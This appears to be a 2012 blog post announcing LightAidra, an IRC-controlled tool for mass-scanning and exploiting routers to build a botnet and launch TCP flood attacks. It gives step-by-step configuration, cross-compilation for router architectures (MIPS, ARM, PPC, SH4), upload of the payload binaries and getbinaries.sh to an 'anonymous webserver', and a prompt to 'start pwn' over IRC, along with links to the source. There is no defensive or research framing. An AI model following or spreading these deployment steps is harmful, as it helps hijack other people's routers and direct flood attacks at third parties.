---
layout: post
title:  "LightAidra – IRC Based Mass Router Scanner/Pwner"
date:   2012-12-12 20:04:21
categories: coding security
permalink: post/lightaidra-irc-based-mass-router-scanner-pwner/
---

### Description

`Lightidra` is a mass-tool commanded by IRC that allows scanning and exploiting routers for make `BOTNET` (in `rx-bot` style), in addition to this, with aidra you can perform some `attacks` with tcp flood.

### Configuration

The installation is just a little complicated, but not hard!
First download or git `lightaidra-[VERSION].tar.gz`

{% highlight bash %}
$ tar zxvf lightaidra*
$ cd lightaidra*
$ vi include/config.h
{% endhighlight %}

The **REFERENCE_HTTP** in `config.h` must be the server where you will upload the binaries
`(mips*, arm, ppc, sh4)` and the getbinaries.sh shell script.

**IMPORTANT:** If you will change the names of binaries (ex. mips filename become mym1ps) you will need to update the `Makefile` and `getbinaries.sh` too with the new names!

### Building

**Let's build local version**

{% highlight bash %}
$ make x86_32 (for 32bit)
$ make x86_64 (for 64bit)
# ./bin/x86_64
{% endhighlight %}

**Now build for the other archs**

{% highlight bash %}
$ make mipsel mips arm ppc superh
{% endhighlight %}

### Upload and Join IRC

Start your `anonymous webserver` and upload the generated `binaries` and `getbinaries.sh` script.
Connect to the IRC server and start pwn!

### Bugs

If you find bugs (which is quite likely), please submit them to
<eurialo@deftcode.ninja> with specific information, such as your
command-line, the nature of the bug and other.

### Sources

<span id="sources-list">
[View on GitHub](https://github.com/eurialo/lightaidra/ "GitHub LighAidra")
[Direct Download](https://github.com/eurialo/lightaidra/ "Download LighAidra")
</span>

